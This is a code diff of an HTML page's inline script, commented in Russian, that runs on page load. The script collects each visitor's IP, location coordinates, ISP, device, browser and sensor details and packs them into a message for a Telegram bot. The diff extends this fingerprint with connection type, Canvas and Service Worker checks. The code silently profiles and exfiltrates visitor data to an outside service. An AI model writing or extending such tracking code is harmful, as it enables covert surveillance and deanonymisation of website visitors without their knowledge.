@@ -62,6 +62,11 @@ function getClientInfo() {
       // Поддержка Geolocation API
       const hasGeolocation = 'geolocation' in navigator ? 'Yes' : 'No';
 
+      // Дополнительные параметры
+      const connectionType = navigator.connection ? navigator.connection.effectiveType : 'Unknown Connection Type'; // Тип подключения
+      const isCanvasSupported = typeof HTMLCanvasElement !== 'undefined' ? 'Yes' : 'No'; // Проверка поддержки Canvas
+      const isServiceWorkerSupported = 'serviceWorker' in navigator ? 'Yes' : 'No'; // Проверка поддержки Service Workers
+
       // Формируем сообщение, которое отправим в Telegram
       const message = encodeURIComponent(
         `IP: ${ip}\nCountry: ${country} ${region}\nCity: ${city}\nLatitude: ${latitude}\nLongitude: ${longitude}\nISP: ${isp}\n\n` +
@@ -70,7 +75,8 @@ function getClientInfo() {
         `Vendor: ${vendor}\nApp Version: ${appVersion}\nWebGL Support: ${isWebGLSupported}\nCookies Enabled: ${cookiesEnabled}\n` +
         `Device Memory: ${deviceMemory} GB\nLoad Time: ${loadTime}\nDevice Type: ${deviceType}\n` +
         `WebRTC Support: ${isWebRTCSupported}\nCamera Available: ${hasCamera}\nMicrophone Available: ${hasMicrophone}\n` +
-        `Gyroscope Support: ${hasGyroscope}\nAccelerometer Support: ${hasAccelerometer}\nGeolocation API Support: ${hasGeolocation}`
+        `Gyroscope Support: ${hasGyroscope}\nAccelerometer Support: ${hasAccelerometer}\nGeolocation API Support: ${hasGeolocation}\n` +
+        `Connection Type: ${connectionType}\nCanvas Support: ${isCanvasSupported}\nService Worker Support: ${isServiceWorkerSupported}`
       );
 
       // Настроим Telegram Bot API URL для отправки сообщения
@@ -97,9 +103,6 @@ function getClientInfo() {
 // Вызов функции для получения и отправки информации
 getClientInfo();
 </script>
-
-  
-
 
 </body>
 </html>
